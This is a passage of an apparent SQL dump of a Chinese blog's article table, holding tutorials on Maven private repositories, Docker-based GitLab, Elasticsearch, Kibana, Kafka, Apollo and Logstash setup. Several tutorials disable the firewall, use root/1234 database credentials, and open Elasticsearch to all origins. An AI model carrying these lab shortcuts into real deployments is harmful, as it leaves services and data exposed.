配置settings.xml中servers下的用户配置信息  -->\n		<id>tuwq</id>\n		<!-- 配置打包url地址信息,这里的地址就是刚创建的仓库的上传url地址 -->\n		<url>http://192.168.147.100:8081/repository/springboot-example-release/</url>\n	</repository>\n</distributionManagement>\n<build>\n	<plugins>\n		<!-- 发布Java代码插件 -->\n		<plugin>\n			<groupId>org.apache.maven.plugins</groupId>\n			<artifactId>maven-deploy-plugin</artifactId>\n			<version>2.7</version>\n		</plugin>\n		<!-- 发布源码插件  -->\n		<plugin>\n			<groupId>org.apache.maven.plugins</groupId>\n			<artifactId>maven-source-plugin</artifactId>\n			<version>2.2.1</version>\n			<executions>\n				<execution>\n					<phase>package</phase>\n					<goals>\n						<goal>jar</goal>\n						</goals>\n				</execution>\n			</executions>\n		</plugin> \n	</plugins>\n</build>\n```\n\n#### 开始上传jar包\n![TIM截图20190429202348.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556545766_TIM截图20190429202348.png)\n![TIM截图20190429202428.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546035_TIM截图20190429202428.png)\n```kotlin\n// 1. 若不满足以下两项,那么会上传失败\n项目version中不能含有SNAPSHOT\n创建仓库时DeploymentPoliecy处选择Allow redeploy\n\n// 2. 进入cmd输入上传jar包至远程仓库的命令\nmvn deploy\n```\n\n#### 查看是否上传成功\n![TIM截图20190429202707.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546035_TIM截图20190429202707.png)\n\n### 下载私服jar包\n#### 引入私服jar包\n![TIM截图20190429215818.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546600_TIM截图20190429215818.png)\n```kotlin\n<!-- 引入jar包 -->\n<dependencies>\n	<dependency>\n		<groupId>com.tuwq</groupId>\n		<artifactId>springboot-basic</artifactId>\n		<version>0.0.1</version>\n	</dependency>\n</dependencies>\n\n<!-- 引入私服仓库 -->\n<repositories>\n	<repository>\n		<id>tuwq</id>\n		<url>http://192.168.147.100:8081/repository/springboot-example-release/</url>\n	</repository>\n</repositories>\n```\n#### 查看是否是私服下载的jar包\n![TIM截图20190429220035.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556546600_TIM截图20190429220035.png)\n```kotlin\n1. 私服下载的jar包中有sha1文件,用户签名加密防篡改\n\n2. 若没有这些文件,说明引入的是本地项目\n\n3. 把与下载相同的本地项目删除并从本地maven仓库中也删除\n\n4. 将需引用jar包的项目进行maven update\n```', 0, 0, 76, 0, 0, '2019-10-05 21:06:00', '2019-10-05 21:06:00', 0, 0);
INSERT INTO `article` VALUES (41, 1, 'docker搭建gitlab', '2019/4/1556626302_19a3eaa31915ee793831a0209c74af2f.jpg', '### 安装配置\n![TIM截图20190429221556.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429221556.png)\n![TIM截图20190429224911.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429224911.png)\n```kotlin\n// 1. 下载镜像\ndocker pull beginor/gitlab-ce:11.0.1-ce.0\n\n// 2. 创建gitlab的三个目录,配置(etc),日志(log),数据(data)\nmkdir -p /mnt/gitlab/etc\nmkdir -p /mnt/gitlab/log\nmkdir -p /mnt/gitlab/data\n\n// 3. 运行gitlab容器\ndocker run \\\n    --detach \\\n    --publish 8443:443 \\\n    --publish 8090:80 \\\n    --name gitlab \\\n    --restart unless-stopped \\\n    -v /mnt/gitlab/etc:/etc/gitlab \\\n    -v /mnt/gitlab/log:/var/log/gitlab \\\n    -v /mnt/gitlab/data:/var/opt/gitlab \\\n    beginor/gitlab-ce:11.0.1-ce.0\n\n```\n![TIM截图20190429225521.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225521.png)\n![TIM截图20190429225732.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225732.png)\n```kotlin\n// 4. 修改/mnt/gitlab/etc/gitlab.rb,把external_url改成部署机器的域名或ip地址\nvi /mnt/gitlab/etc/gitlab.rb\n\nexternal_url \'http://192.168.212.227\'\n\n```\n\n![TIM截图20190429225838.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225838.png)\n![TIM截图20190429225938.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626609_TIM截图20190429225938.png)\n```kotlin\n// 5. 修改/mnt/gitlab/data/gitlab-rails/etc/gitlab.yml\nvi /mnt/gitlab/data/gitlab-rails/etc/gitlab.yml\n\nhost: 192.168.147.100\nport: 8090\n```\n\n![TIM截图20190429231611.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626637_TIM截图20190429231611.png)\n```kotlin\n// 6. 停止容器\ndocker stop [容器id]\n\n// 7. 删除容器\ndocker rm [容器id]\n\n// 8. 重启容器\nsystemctl restart docker\n\n// 9. 运行容器\ndocker run \\\n    --detach \\\n    --publish 8443:443 \\\n    --publish 8090:80 \\\n    --name gitlab \\\n    --restart unless-stopped \\\n    -v /mnt/gitlab/etc:/etc/gitlab \\\n    -v /mnt/gitlab/log:/var/log/gitlab \\\n    -v /mnt/gitlab/data:/var/opt/gitlab \\\n    beginor/gitlab-ce:11.0.1-ce.0 \n\n//10. 关闭防火墙\nsystemctl stop firewalld \n```\n\n### 检查安装成功\n![TIM截图20190429230757.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429230757.png)\n![TIM截图20190429231047.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429231047.png)\n![TIM截图20190429231216.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429231216.png)\n![TIM截图20190429231252.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1556626689_TIM截图20190429231252.png)', 0, 0, 35, 0, 0, '2019-10-07 20:11:55', '2019-10-07 20:11:55', 0, 0);
INSERT INTO `article` VALUES (42, 1, 'apollo分布式配置中心环境搭建', '2019/5/1556945147_659652b5c781b079c9cf363b6e3134b9.jpg', '### 安装环境\n#### 添加数据库\n![TIM截图20190504132359.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947556_TIM截图20190504132359.png)\n![TIM截图20190504132547.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947556_TIM截图20190504132547.png)\n#### 解压文件\n![TIM截图20190501230405.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190501230405.png)\n```kotlin\n// 1. 安装zip,如果有的话就不用了\nyum -y install zip unzip\n\n// 2. 解压apollo文件\nunzip apollo-build-scripts-master.zip\n```\n#### 修改配置\n![TIM截图20190501231044.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190501231044.png)\n![TIM截图20190504130401.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190504130401.png)\n```kotlin\n// 3. 进入文件\ncd apollo build-scripts-master/\n\n// 4. 修改demo.sh\nvi demo.sh\n\n// 5. 修改apollo所需的数据库信息\napollo_config_db_url=jdbc:mysql://192.168.147.101:3306/ApolloConfigDB?characterEncoding=utf8\napollo_config_db_username=root\napollo_config_db_password=1234\n\napollo_portal_db_url=jdbc:mysql://192.168.147.101:3306/ApolloPortalDB?characterEncoding=utf8\napollo_portal_db_username=root\napollo_portal_db_password=1234\n\nconfig_server_url=http://192.168.147.101:8080\nadmin_server_url=http://192.168.147.101:8090\neureka_service_url=$config_server_url/eureka/\nportal_url=http://192.168.147.101:8070\n```\n\n#### 启动apollo\n![TIM截图20190501235159.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556946385_TIM截图20190501235159.png)\n```kotlin\n// 5. 启动apollo,需要等待将近一分钟\n./demo.sh start\n\n// 6. 关闭防火墙\nsystemctl stop firewalld\n```\n### 检查启动状态\n#### 查看配置中心与apollo自带的eureka是否启动成功\n![TIM截图20190504131950.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947285_TIM截图20190504131950.png)\n![TIM截图20190504132107.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1556947286_TIM截图20190504132107.png)', 0, 0, 38, 0, 0, '2019-10-08 12:45:57', '2019-10-08 12:45:57', 0, 0);
INSERT INTO `article` VALUES (43, 1, 'docker安装elasticsearch单机与集群', '2019/5/1557919789_3079d35197480a3248231f3cd0b61a73.jpg', '### docker安装单机elasticsearch与kibana\n![TIM截图20190513215541.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557920265_TIM截图20190513215541.png)\n![TIM截图20190513215244.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557920265_TIM截图20190513215244.png)\n![TIM截图20190513215147.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557920265_TIM截图20190513215147.png)\n\n#### 安装elasticsearch\n```kotlin\n// 1. 下载ES镜像问题\ndocker pull elasticsearch\n\n// 2. 运行ES\ndocker run -it --name elasticsearch -d -p 9200:9200 -p 9300:9300 -p 5601:5601 elasticsearch\n\n// 3. 测试运行结果\nhttp://192.168.212.245:9200/\n\n// !若访问失败,检查是否关闭防火墙\nsystemctl stop firewalld\n\n// !若运行失败,检查docker日志,内存不足2G会导致失败\ndocker log 容器id\n```\n#### 安装kibana\n```kotlin\n// 1. 运行kibana,前提是运行elasticsearch成功\ndocker run -it -d -e ELASTICSEARCH_URL=http://127.0.0.1:9200 --name kibana --network=container:elasticsearch kibana\n// 2. 测试运行结果\nhttp://192.168.212.245:5601/app/kibana\n\n```\n\n### docker安装集群elasticsearch与kibana\n![TIM截图20190515214636.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933295_TIM截图20190515214636.png)\n![TIM截图20190515220308.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933295_TIM截图20190515220308.png)\n![TIM截图20190515221133.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933295_TIM截图20190515221133.png)\n![TIM截图20190515221318.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515221318.png)\n![TIM截图20190515222919.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515222919.png)\n![TIM截图20190515223426.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515223426.png)\n![TIM截图20190515223626.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933296_TIM截图20190515223626.png)\n\n```kotlin\n// 1. 删除之前单机版的elasticsearch与kibana容器\ndocker rm $(sudo docker ps -a -q) // 删除所有未运行的容器\n\n// 2. 进入/usr/local创建es相关文件夹\ncd /usr/local\nmkdir -p es/config\ncd es\n\n// 3. 创建集群相关文件夹\nmkdir data1\nmkdir data2\nmkdir  plugins1\nmkdir  plugins2\n\n// 4. 开放两个es节点的tcp端口\nfirewall-cmd --add-port=9300/tcp\nfirewall-cmd --add-port=9301/tcp\n\n// 5. 在es/config分别放入es1.yml、es2.yml\n// es1.yml\ncluster.name: elasticsearch-cluster\nnode.name: es-node1\nnetwork.bind_host: 0.0.0.0\nnetwork.publish_host: 192.168.147.100\nhttp.port: 9200\ntransport.tcp.port: 9300\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\nnode.master: true \nnode.data: true  \ndiscovery.zen.ping.unicast.hosts: [\"192.168.147.100:9300\",\"192.168.147.100:9301\"]\ndiscovery.zen.minimum_master_nodes: 1 \n// es2.yml\ncluster.name: elasticsearch-cluster\nnode.name: es-node2\nnetwork.bind_host: 0.0.0.0\nnetwork.publish_host: 192.168.147.100\nhttp.port: 9201\ntransport.tcp.port: 9301\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\nnode.master: true \nnode.data: true  \ndiscovery.zen.ping.unicast.hosts: [\"192.168.147.100:9300\",\"192.168.147.100:9301\"]\ndiscovery.zen.minimum_master_nodes: 1 \n\n7. 修改/etc/sysctl.conf文件,否则es启动会出现内存分配不足错误\nvi /etc/sysctl.conf\nvm.max_map_count=262144\nsysctl -p\n\n6. 启动容器节点1\ndocker run -e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" -d -p 9200:9200 -p 9300:9300 -p 5601:5601 -v /usr/local/es/config/es1.yml:/usr/share/elasticsearch/config/elasticsearch.yml -v /usr/local/es/plugins1:/usr/share/elasticsearch/plugins -v /usr/local/es/data1:/usr/share/elasticsearch/data --name ES01 elasticsearch\n\n7. 启动容器节点2\ndocker run -e ES_JAVA_OPTS=\"-Xms256m -Xmx256m\" -d -p 9201:9201 -p 9301:9301 -v /usr/local/es/config/es2.yml:/usr/share/elasticsearch/config/elasticsearch.yml -v /usr/local/es/plugins2:/usr/share/elasticsearch/plugins -v /usr/local/es/data2:/usr/share/elasticsearch/data --name ES02 elasticsearch\n\n8. 查看集群节点信息\nhttp://192.168.147.100:9200/_cat/nodes?pretty\n```\n\n#### es集群启动kibana\n![TIM截图20190515224607.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933784_TIM截图20190515224607.png)\n```kotlin\n// 1. 启动kibana,随便选取集群中一个es节点的tcp端口\ndocker run -it -d -e ELASTICSEARCH_URL=http://127.0.0.1:9200 --name kibana --network=container:ES01 kibana\n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 查看kibana是否在docker中正常运行\ndocker ps\n\n// 4. 访问kibana\nhttp://192.168.147.100:5601/app/kibana\n```', 0, 0, 54, 0, 0, '2019-10-11 19:30:10', '2019-10-11 19:30:10', 0, 0);
INSERT INTO `article` VALUES (44, 1, 'logstash将mysql数据同步至elasticsearch', '2019/5/1557921111_38291b7a45886cb77cc94811b11a5016.jpg', '### 安装logstash\n#### 安装logstash并安装输入输出插件\n![TIM截图20190514203528.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514203528.png)\n\n### 同步单张表至elasticsearch\n#### 创建预备的数据表\n![TIM截图20190514220905.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514220905.png)\n\n#### 编写logstash所识别的配置文件\n![TIM截图20190514221956.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514221956.png)\n\n#### 上传mysql驱动包与配置文件并运行logstash\n![TIM截图20190514220313.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514220313.png)\n![TIM截图20190514221025.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922236_TIM截图20190514221025.png)\n\n#### 查看是否成功输出至elasticsearch\n![TIM截图20190514221151.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557922292_TIM截图20190514221151.png)\n\n#### 步骤命令\n```kotlin\n// 1. 上传logstash-6.4.3.tar.gz到服务中\n// 2. 解压logstash压缩包\ntar –zxvf  logstash-6.4.3.tar.gz\n\n// 3. 进入logstash目录\ncd logstash-6.4.3\n\n// 4. 安装输入插件\nbin/logstash-plugin install logstash-input-jdbc\n\n// 5. 安装输出插件\nbin/logstash-plugin install logstash-output-elasticsearch\n\n// 6. 编写logstash所识别的配置文件\n// 7. 上传mysql驱动包至/usr/local/sql/ mysql-connector-java-5.1.46.jar\n// 8. ./bin/logstash -f mysql.conf 指定配置文件启动\n./bin/logstash -f mysql.conf\n```\n\n#### logstash的配置文件信息\n```kotlin\n## 配置文件说明\ninput {\n  jdbc {\n    jdbc_driver_library => \"/usr/local/sql/mysql-connector-java-5.1.46.jar\"\n    jdbc_driver_class => \"com.mysql.jdbc.Driver\"\n    jdbc_connection_string => \"jdbc:mysql://192.168.147.101:3306/test?useSSL=false\"\n    jdbc_user => \"root\"\n    jdbc_password => \"1234\"\n    schedule => \"* * * * *\"\n    statement => \"SELECT * FROM user WHERE update_time >= :sql_last_value\"\n    # 使用递增值\n    use_column_value => true\n    # 递增类型时间戳\n    tracking_column_type => \"timestamp\"\n    # 表中的递增字段\n    tracking_column => \"update_time\"\n    last_run_metadata_path => \"syncpoint_table\"\n  }\n}\n\n\noutput {\n    elasticsearch {\n        # ES的IP地址及端口\n        hosts => [\"192.168.147.100:9200\"]\n        # 索引名称 可自定义\n        index => \"user\"\n        # 需要关联的数据库中有有一个id字段，对应类型中的id\n        document_id => \"%{id}\"\n        document_type => \"user\"\n    }\n    stdout {\n        # JSON格式输出\n        codec => json_lines\n    }\n} \n```\n\n#### logstash配置文件详细说明\n```kotlin\n## 配置文件说明\njdbc_driver_library: // jdbc的信息\njdbc_driver_class: // 驱动类的名字，mysql填 com.mysql.jdbc.Driver\njdbc_connection_string: // mysql地址\njdbc_user: // mysql用户\njdbc_password: // mysql密码\nschedule: // 执行 sql 时机，类似 crontab 的调度\nstatement: // 要执行的 sql，以 “:” 开头是定义的变量，可以通过 parameters 来设置变量，这里的 sql_last_value 是内置的变量，表示上一次 sql 执行中 update_time 的值，这里 update_time 条件是 >= 因为时间有可能相等，没有等号可能会漏掉一些增量\nuse_column_value: // 使用递增列的值\ntracking_column_type: // 递增字段的类型，numeric 表示数值类型, timestamp 表示时间戳类型\ntracking_column: // 递增字段的名称，这里使用 update_time 这一列，这列的类型是 timestamp\nlast_run_metadata_path: // 同步点文件，这个文件记录了上次的同步点，重启时会读取这个文件，这个文件可以手动\n```\n\n### 同步多张表至elasticsearch\n![TIM截图20190514223725.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923220_TIM截图20190514223725.png)\n![TIM截图20190514223534.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923676_TIM截图20190514223534.png)\n![TIM截图20190514224558.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923220_TIM截图20190514224558.png)\n![TIM截图20190514224649.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557923220_TIM截图20190514224649.png)\n```kotlin\n// 1. 进入logstash的config目录\ncd /usr/local/logstash-6.4.3/config\n\n// 2. 修改pipelines文件\nvi pipelines.yml\n\n// 3. 添加logstash输入输出的配置文件位置\n- pipeline.id: table1\n  path.config: \"config/sync_table1.cfg\"\n- pipeline.id: table2\n  path.config: \"config/sync_table2.cfg\"\n\n// 4. 不指定配置文件运行,logstash将以config/pipelines.yml文件中配置内容运行\n./bin/logstash\n```\n\n### logstash原理\n```java\n// logstashd的输入与输出\n1. 输入（读取本地文件或者连接数据库）\n2. 输出（输出json至存储库)\n\n// 如何数据新增呢？或者修改\n// 1. 第一次发送sql请求的时候,修改时间参数值是为系统最开始的时间是1970年，可以查询到所有的数据,\n// 会将最后一条数据的update_time修改时间值记录下来，作为下一次修改时间查询的条件值\n// 2.  第一条\nSELECT * FROM user WHERE update_time >=\'1970\'\n// 3. 第二条\nSELECT * FROM user WHERE update_time >=\'2019-05-15 20:47:15\n// 新增或者修改、删除的时候logstash都会记录update_time时间。\n\n// 书面原理\n1. 定时执行一个 sql，然后将 sql 执行的结果写入到流中\n2. 增量获取的方式没有通过 binlog 方式同步，而是用一个递增字段作为条件去查询，每次都记录当前查询的位置\n3. 由于递增的特性，只需要查询比当前大的记录即可获取这段时间内的全部增量，一般的递增字段有两种，AUTO_INCREMENT 的主键 id 和 ON UPDATE CURRENT_TIMESTAMP 的 update_time 字段\n4. id 字段只适用于那种只有插入没有更新的表，update_time 更加通用一些，建议在 mysql 表设计的时候都增加一个 update_time 字段\n\n```\n### 连接elasticsearch集群\n![TIM截图20190515224807.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933576_TIM截图20190515224807.png)\n![TIM截图20190515230202.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1557933576_TIM截图20190515230202.png)\n```kotlin\n// 1. 修改每张表的logstash配置文件\nvi mysql_1.conf\nvi mysql_2.conf\n\n// 2. es服务列表添加es节点地址\nhosts => [\"192.168.147.100:9200\",\"192.168.147.100:9201\"]\n\n// 3. 启动logstash\n./bin/logstash -f\n```', 0, 0, 58, 0, 0, '2019-10-12 19:51:57', '2019-10-12 19:51:57', 0, 0);
INSERT INTO `article` VALUES (45, 1, 'elasticsearch配置IK中文分词器及pinyin拼音分词器', '2019/5/1558176015_038447c6811547957643f80617c0c99d.jpg', '### 安装IK分词器\n```java\n// 检查es版本\n// 分词器的版本需要和es版本一致\n```\n![TIM截图20190516211551.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176703_TIM截图20190516211551.png)\n\n#### 修改IKAnalyzer.cfg.xml\n![TIM截图20190518172340.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176993_TIM截图20190518172340.png)\n\n#### 上传IK分词器包并启动es集群\n![TIM截图20190518140106.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176703_TIM截图20190518140106.png)\n\n#### 查看ik是否安装成功\n![TIM截图20190518140339.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558176704_TIM截图20190518140339.png)\n\n### IK分词模式\n![TIM截图20190518190632.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558177787_TIM截图20190518190632.png)\n![TIM截图20190518190756.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558177787_TIM截图20190518190756.png)\n```java\n// ik_smart与ik_max_word区别\n1. ik_smart: 会做*最粗粒度的拆分*，比如会将\"中华人民共和国国歌\"拆分为\"中华人民共和国,国歌\"。\n2. ik_max_word: 会将文本做*最细粒度的拆分*，比如会将\"中华人民共和国国歌\"拆分为\"中华人民共和国,中华人民,中华,华人,人民共和国,人民,人,民,共和国,共和,和,国国,国歌\"，会穷尽各种可能的组合\n\n```\n### 使用IK进行分词查询\n#### 解决logstash默认创建索引映射不使用指定分词器问题\n![TIM截图20190518141541.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518141541.png)\n![TIM截图20190518141752.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518141752.png)\n![TIM截图20190518192251.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178605_TIM截图20190518192251.png)\n```kotlin\n// 1. 删除原有logstash自动创建的默认索引\nDELETE /user\n\n// 2. 重新创建索引 	\nPUT /user\n\n// 3. 自定义的索引映射\nPOST /user/_mapping/user\n{\n  \"user\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"@version\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"id\": {\n        \"type\": \"long\"\n      },\n      \"name\": {\n        \"type\": \"text\",\n        \"analyzer\":\"ik_smart\",\n        \"search_analyzer\":\"ik_smart\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"update_time\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n\n// 4.查看索引映射信息,检查是否创建成功\nGET /user/_mapping \n```\n![TIM截图20190518142645.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518142645.png)\n![TIM截图20190518142721.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518142721.png)\n![TIM截图20190518142853.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518142853.png)\n\n#### 测试IK是否奏效\n![TIM截图20190518172154.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558178065_TIM截图20190518172154.png)\n\n### 安装pinyin分词器\n#### 上传pinyin分词器包并启动es集群\n![TIM截图20190518195854.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186350_TIM截图20190518195854.png)\n\n#### 查看pinyin分词器是否安装成功\n![TIM截图20190518200008.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186350_TIM截图20190518200008.png)\n![TIM截图20190518200445.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186350_TIM截图20190518200445.png)\n\n### 使用ik+pinyin进行分词查询\n#### 解决logstash默认创建索引映射不使用指定分词器问题\n![TIM截图20190518201500.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518201500.png)\n![TIM截图20190518203106.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518203106.png)\n![TIM截图20190518204044.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518204044.png)\n![TIM截图20190518210929.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518210929.png)\n```kotlin\n// 1. 删除原有的索引映射\nDELETE /user\n\n// 2. 自定义分词器ik_smart_pinyin和ik_max_word_pinyin,将IK分词器与pinyin分词器合并使用\nPUT /user \n{\n   \"settings\": {\n        \"analysis\": {\n            \"analyzer\": {\n                \"ik_smart_pinyin\": {\n                    \"type\": \"custom\",\n                    \"tokenizer\": \"ik_smart\",\n                    \"filter\": [\"my_pinyin\", \"word_delimiter\"]\n                },\n                \"ik_max_word_pinyin\": {\n                    \"type\": \"custom\",\n                    \"tokenizer\": \"ik_max_word\",\n                    \"filter\": [\"my_pinyin\", \"word_delimiter\"]\n                }\n            },\n            \"filter\": {\n                \"my_pinyin\": {\n                    \"type\" : \"pinyin\",\n                    \"keep_separate_first_letter\" : true,\n                    \"keep_full_pinyin\" : true,\n                    \"keep_original\" : true,\n                    \"limit_first_letter_length\" : 16,\n                    \"lowercase\" : true,\n                    \"remove_duplicated_term\" : true \n                }\n            }\n        }\n  }\n}\n\n// 3. 自定义索引映射,索引字段使用自定义的分词器\nPOST /user/_mapping/user\n{\n  \"user\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      },\n      \"@version\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"id\": {\n        \"type\": \"long\"\n      },\n      \"name\": {\n        \"type\": \"text\",\n        \"analyzer\":\"ik_smart_pinyin\",\n        \"search_analyzer\": \"ik_smart_pinyin\",\n        \"fields\": {\n          \"keyword\": {\n            \"type\": \"keyword\",\n            \"ignore_above\": 256\n          }\n        }\n      },\n      \"update_time\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n\n// 4. 查询索引映射信息,检查是否创建成功\nGET /user/_mapping\n```\n#### 测试pinyin是否奏效\n![TIM截图20190518211327.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558186351_TIM截图20190518211327.png)', 0, 0, 58, 0, 0, '2019-10-12 18:40:23', '2019-10-12 18:40:23', 0, 0);
INSERT INTO `article` VALUES (46, 1, 'docker分布式日志收集ELK搭建', '2019/5/1558265177_8a215d98bcadbd79036ed1d2e161b42a.jpg', '### 搭建目标\n![Kafkaelk作用.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626680678_Kafka-elk作用.png)\n```java\n// 流程\n1. 应用中出现错误需记录日志时,将日志发送给kafka\n2. logstash获取kafka中的日志信息内容\n3. logstash再将日志写入elasticsearch,这样elasticsearch就有了日志数据了\n4. 最后,使用kibana将存放在elasticsearch中的日志数据显示出来,并且可以做实时的数据图表分析等等\n\n// 为什么要分布式日志收集\n1. 在传统项目中，如果在生产环境中，有多台不同的服务器集群，如果生产环境需要通过日志定位项目的Bug的话，需要在每台节点上使用传统的命令方式查询，这样效率非常底下\n2. 通常，日志被分散在储存不同的设备上。如果你管理数十上百台服务器，你还在使用依次登录每台机器的传统方法查阅日志。这样是不是感觉很繁琐和效率低下。当务之急我们使用集中化的日志管理，例如：开源的syslog，将所有服务器上的日志收集汇总。\n3. 集中化管理日志后，日志的统计和检索又成为一件比较麻烦的事情，一般我们使用grep、awk和wc等Linux命令能实现检索和统计，但是对于要求更高的查询、排序和统计等要求和庞大的机器数量依然使用这样的方法难免有点力不从心。\n4. 我们需要统一管理日志并快速排查问题\n5. 运用elasticsearch+logstash+kafka+kibana的组合可以解决这个问题\n\n```\n### 下载kafka与zookeeper\n![TIM截图20190519151904.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_TIM截图20190519151904.png)\n![TIM截图20190519155741.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_TIM截图20190519155741.png)\n![TIM截图20190519160613.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558268929_TIM截图20190519160613.png)\n```kotlin\n// 1. 重启docker并删除所有未运行的容器\nsystemctl restart docker\ndocker rm $(sudo docker ps -a -q)\n\n// 2. 下载kafka和Zookeeper镜像文件\ndocker pull wurstmeister/kafka\ndocker pull wurstmeister/zookeeper\n\n// 3. 运行Zookeeper环境\ndocker run -d --name zookeeper -p 2181:2181 -t wurstmeister/zookeeper\n\n// 4. 关闭防火墙,防止kafka访问不到zookeeper\nsystemctl stop firewalld\n\n// 5. 运行Kafka环境,注意服务ip\ndocker run --name kafka01 \\\n		-p 9092:9092 \\\n		-e KAFKA_BROKER_ID=0 \\\n		-e KAFKA_ZOOKEEPER_CONNECT=192.168.147.100:2181 \\\n		-e KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://192.168.147.100:9092 \\\n		-e KAFKA_LISTENERS=PLAINTEXT://0.0.0.0:9092 \\\n		-d  wurstmeister/kafka\n\n// 6. kafka-manager有图形化UI,注意服务ip\ndocker run -itd \\\n		--restart=always \\\n		--name=kafka-manager \\\n		-p 9000:9000 \\\n		-e ZK_HOSTS=\"192.168.147.100:2181\" \\\n		sheepkiller/kafka-manager\n\n// 7. 进入kafka容器\ndocker exec -it kafka01 /bin/bash\n\n// 8. 创建my_log topic,注意服务ip\n/opt/kafka/bin/kafka-topics.sh --create --zookeeper 192.168.147.100:2181 --replication-factor 1 --partitions 1 --topic my_log\n\n// 9. 查询创建的主题,检查主题是否成功发布,注意服务ip\n/opt/kafka/bin/kafka-topics.sh --list --zookeeper 192.168.147.100:2181\n```\n### logstash读取kafka中日志内容并输出至elasticsearch\n#### 